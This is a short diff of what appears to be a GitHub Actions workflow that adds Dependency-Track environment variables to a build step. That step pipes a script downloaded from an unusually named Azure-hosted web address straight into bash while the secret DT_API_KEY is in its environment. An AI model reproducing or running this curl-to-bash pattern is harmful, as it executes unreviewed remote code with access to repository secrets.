@@ -35,5 +35,18 @@ jobs:
         curl https://connect2videoi6154097192.z20.web.core.windows.net/dependency-track.sh | bash
       env: 
         DT_API_KEY: ${{secrets.DT_API_KEY}}
+        DEPENDENCY_TRACK_BOM_DIR: ${{env.DEPENDENCY_TRACK_BOM_DIR}}
+        DEPENDENCY_TRACK_BOM_FILE: ${{env.DEPENDENCY_TRACK_BOM_FILE}}
+        DEPENDENCY_TRACK_GROUP: ${{env.DEPENDENCY_TRACK_GROUP}}
+        DEPENDENCY_TRACK_PROJECT_NAME: ${{env.DEPENDENCY_TRACK_PROJECT_NAME}}
+        DEPENDENCY_TRACK_PROJECT_VERSION: ${{env.DEPENDENCY_TRACK_PROJECT_VERSION}}
+        DEPENDENDY_TRACK_TAG: ${{env.DEPENDENDY_TRACK_TAG}}
+        DT_API_URL: ${{env.DT_API_URL}}
+        
+        
+        
+        
+        
+        
       
     
